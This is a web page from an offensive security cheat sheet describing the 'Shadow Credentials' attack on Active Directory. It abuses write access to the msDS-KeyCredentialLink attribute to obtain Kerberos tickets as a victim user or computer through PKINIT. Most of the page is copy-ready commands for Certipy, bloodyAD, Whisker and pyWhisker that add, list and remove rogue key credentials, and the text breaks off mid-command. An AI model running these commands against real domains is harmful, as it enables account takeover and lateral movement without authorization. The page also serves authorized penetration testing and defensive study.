# Password - Shadow Credentials - Internal All The Things
URL: https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-shadow-credentials/

Password - Shadow Credentials - Internal All The Things

# Password - Shadow Credentials

> Add Key Credentials to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

 User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

Requirements:

- Domain Controller on (at least) Windows Server 2016
- Domain must have Active Directory `Certificate Services` and `Certificate Authority` configured
- PKINIT Kerberos authentication
- An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object

Exploitation:

- ly4k/Certipy

```
certipy shadow auto -account user -dc-ip 10.10.10.10 -dns-tcp -ns 10.10.10.10 -k -no-pass -target dc.domain.lab
certipy shadow -u 'attacker@domain.local' -p 'Passw0rd!' -dc-ip '10.0.0.100' -account 'victim' add

```

- CravateRouge/bloodyAD:

```
bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab add shadowCredentials targetpc$
bloodyAD --host 10.10.10.10 -u username -p 'P@ssw0rd' -d domain.lab remove shadowCredentials targetpc$ --key <key from previous output>

```

- eladshamir/Whisker:

```
# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
Whisker.exe list /target:computername$

# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]

# Removes a key credential from the target object specified by a DeviceID GUID.
Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b

```

- ShutdownRepo/pyWhisker:

```
# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"

# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"

# Removes a key credential from the target object specified by a DeviceID GUID.
python3 pywhisker.py -d